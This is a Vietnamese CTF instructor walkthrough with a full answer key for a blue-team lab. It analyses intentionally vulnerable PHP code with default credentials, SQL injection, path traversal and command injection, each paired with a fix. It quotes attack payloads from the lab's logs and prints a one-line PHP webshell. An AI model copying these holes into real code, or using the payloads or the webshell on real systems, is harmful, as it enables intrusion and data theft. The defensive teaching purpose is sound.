Write-up — CTF Level 3 helpdesk-01

Góc Blue Team / IR: recon → timeline log → trích IOC → nộp flag. Dữ liệu dưới đây lấy từ bài thật với CTF_SEED=42 (nếu build seed khác, giá trị đổi nhưng cách làm giữ nguyên).

Lưu ý giảng viên: trang này chứa đáp án đầy đủ — chỉ chia sẻ sau buổi hoặc cho nhóm cần walkthrough. Login lab web: admin / admin. Terminal: cổng host map tới ttyd (vd. :8080 / :8081).

1. Chuẩn bị & tư duy

Bạn vào phiên terminal CTF:

$ ctf register <callsign>
$ ctf login <callsign>
$ ctf
$ hostname
helpdesk-01

Ticket SOC nói máy bất thường — không đưa checklist kỹ thuật. Việc của bạn: tự tìm dịch vụ, đọc log, dựng chuỗi sự cố.

  • Tối đa 2 lần nộp / câu
  • ctf hint <id> confirm trừ điểm ngay (~20%)
  • Đáp án có | phải bọc nháy: ctf submit F6 'a|b|c'

2. Recon: cổng → process → log

2.1. Máy đang listen gì?

analyst@helpdesk-01:/# netstat -lntp
# hoặc: ss -lntp
Proto Recv-Q Send-Q Local Address   Foreign Address  State   PID/Program name
tcp        0      0 0.0.0.0:80      0.0.0.0:*        LISTEN  42/socat
tcp        0      0 0.0.0.0:7681    0.0.0.0:*        LISTEN  1/ttyd

Đọc output:

  • :80 → có HTTP local → thử curl http://127.0.0.1/
  • :7681 → ttyd (cổng terminal CTF), bỏ qua khi điều tra web
  • PID 42 giữ cổng 80 → xem process là gì

2.2. Process cổng 80 là nginx hay gì?

analyst@helpdesk-01:/# ps -fp 42
analyst@helpdesk-01:/# ps -ef | grep -E 'nginx|apache|httpd|socat' | grep -v grep
root  42  ... socat TCP-LISTEN:80 ... TCP:web:80

Trong lab này cổng 80 thường là socat proxy sang container web (Apache+PHP). Vẫn có HTTP tại http://127.0.0.1/.

Phân tích lỗ hổng web (kèm source)

Phần này dành cho Blue Team / DevSecOps: hiểu vì sao attacker làm được những gì đã thấy trên log, map code → CWE → cách vá. Source lấy từ app lab web/app/*.php và webshell trên overlay.

Bản đồ bề mặt tấn công

V1 — Default credentials (login.php)

CWE-798 Hard-coded / default password · liên quan W0

<?php
require __DIR__ . '/common.php';
$err = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $u = isset($_POST['user']) ? (string)$_POST['user'] : '';
  $p = isset($_POST['pass']) ? (string)$_POST['pass'] : '';
  // intentional default creds
  if ($u === 'admin' && $p === 'admin') {
    $_SESSION['user'] = 'admin';
    header('Location: /index.php?welcome=admin');
    exit;
  }
  $err = 'Invalid credentials';
}
?>

Phân tích:

  • So khớp cứng admin/admin trong source — không hash, không MFA, không đổi bắt buộc lần đầu.
  • Attacker (và người điều tra) đoán được credential phổ biến lúc dựng máy.
  • Sau login, session PHP mở cửa toàn bộ endpoint nguy hiểm bên dưới.

Dấu hiệu trên log (SEED=42):

POST /login.php → 302
GET /index.php?welcome=admin (user field = admin)

Cách vá (Blue Team / Dev):

  • Cấm default password; bắt đổi pass lần đầu; dùng hash (argon2id/bcrypt) + salt.
  • Rate-limit / lockout login; cảnh báo SOC khi login từ IP lạ.
  • Không hard-code secret trong source — đưa ra secret manager / env được bảo vệ.

V2 — SQL Injection (search.php)

CWE-89 SQL Injection · liên quan W1

<?php
require __DIR__ . '/common.php';
require_login();
$q = isset($_GET['q']) ? (string)$_GET['q'] : '';
$rows = [];
$error = '';
if ($q !== '') {
  // intentional SQLi
  $sql = "SELECT id, title, body FROM tickets WHERE title LIKE '%" . $q . "%'";
  try {
    $rows = db()->query($sql)->fetchAll(PDO::FETCH_ASSOC);
  } catch (Exception $e) {
    $error = $e->getMessage();
  }
}
?>

Phân tích:

  • $q từ $_GET được nối thẳng vào SQL → attacker đóng chuỗi ' và chèn UNION SELECT ....
  • Query gốc chọn 3 cột (id, title, body) → UNION phải khớp 3 cột (lab: 1,username,token).
  • Bảng secrets chứa token nhạy cảm → lộ qua cùng connection SQLite.
  • htmlspecialchars chỉ bảo vệ XSS khi in ra HTML — không chống SQLi.

Payload đã thấy trên log:

q=' UNION SELECT username,token FROM secrets--
→ note=hdk_695c024ed1f3

Code an toàn (ý tưởng vá):

$stmt = db()->prepare('SELECT id, title, body FROM tickets WHERE title LIKE ?');
$stmt->execute(['%' . $q . '%']);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
// Tách quyền: account app không được SELECT secrets; secrets không nằm cùng DB public

V3 — Path traversal / Arbitrary file read (page.php)

CWE-22 Path Traversal · liên quan W2

<?php
require __DIR__ . '/common.php';
require_login();
$file = isset($_GET['file']) ? (string)$_GET['file'] : 'readme.txt';
// intentional path traversal — only under docroot-ish
$base = __DIR__;
$path = $base . '/' . $file;
$content = '';
if (is_file($path)) {
  $content = file_get_contents($path);
} else {
  $content = 'not found';
}
?>

Phân tích:

  • $file gắn trực tiếp sau $base/ — không canonicalize, không allowlist.
  • ../ hoặc đơn giản .env (cùng docroot) → đọc secret cấu hình.
  • Trên log SEED=42: file=../../.env và hit=APP_KEY=....

Cách vá:

$allowed = ['readme.txt', 'faq.txt'];
if (!in_array($file, $allowed, true)) { http_response_code(400); exit; }
$realBase = realpath($base);
$realPath = realpath($base . DIRECTORY_SEPARATOR . $file);
if ($realPath === false || strpos($realPath, $realBase) !== 0) { exit; }
$content = file_get_contents($realPath);
// Không đặt .env trong webroot; dùng env ngoài document root

V4 — OS Command Injection (diag.php)

CWE-78 OS Command Injection · liên quan W3

<?php
require __DIR__ . '/common.php';
require_login();
$host = isset($_GET['host']) ? (string)$_GET['host'] : '';
$out = '';
if ($host !== '') {
  // intentional OS command injection
  $out = shell_exec('ping -c 1 ' . $host . ' 2>&1');
}
?>

Phân tích:

  • Input user nối vào chuỗi lệnh shell → metachar ; | && $() phá vỡ ý định “chỉ ping”.
  • Log: host=127.0.0.1%3Buname → ping -c 1 127.0.0.1;uname → chạy thêm uname.
  • Tiến trình chạy với quyền user web (www-data) — vẫn đủ để đọc file, reverse shell, ghi webshell tùy cấu hình.

Cách vá:

// 1) Validate nghiêm: chỉ IP/hostname hợp lệ
if (!filter_var($host, FILTER_VALIDATE_IP) && !preg_match('/^[a-z0-9.-]+$/i', $host)) {
  exit('invalid host');
}
// 2) Không qua shell: escapeshellarg + hoặc API không shell
$out = shell_exec('ping -c 1 ' . escapeshellarg($host) . ' 2>&1');
// 3) Tốt hơn: bỏ hẳn shell_exec; dùng thư viện / capability riêng; tách network diag ra tool nội bộ có ACL

V5 — Webshell / RCE artifact (uploads/media_4256.php)

CWE-94 Code Injection · CWE-434 Unrestricted Upload · liên quan F1

<?php
if(isset($_REQUEST['c'])){ system($_REQUEST['c']); }
?>

Phân tích:

  • File PHP trong thư mục web-accessible gọi system() trên tham số request → RCE đầy đủ với mọi request tới file này.
  • Trên access log: hàng loạt POST /uploads/media_4256.php từ IP attacker.
  • Trong lab, shell có thể được tạo qua OS inject (W3) hoặc đã được attacker thả sẵn — điểm chung: document root cho phép thực thi code upload.

Cách vá / harden:

  • Upload chỉ vào ngoài docroot hoặc storage không exec; rename random; scan nội dung.
  • Web server: php_admin_flag engine off trong /uploads, hoặc chỉ static.
  • WAF / EDR: alert khi PHP mới xuất hiện dưới webroot; monitor system/exec/passthru.
  • IR: xóa webshell, rotate secret đã lộ (APP_KEY, token DB), reset credential admin/oracle.

Ghi chú — require_login() không đủ

function require_login() {
  if (empty($_SESSION['user'])) {
    header('Location: /login.php');
    exit;
  }
}
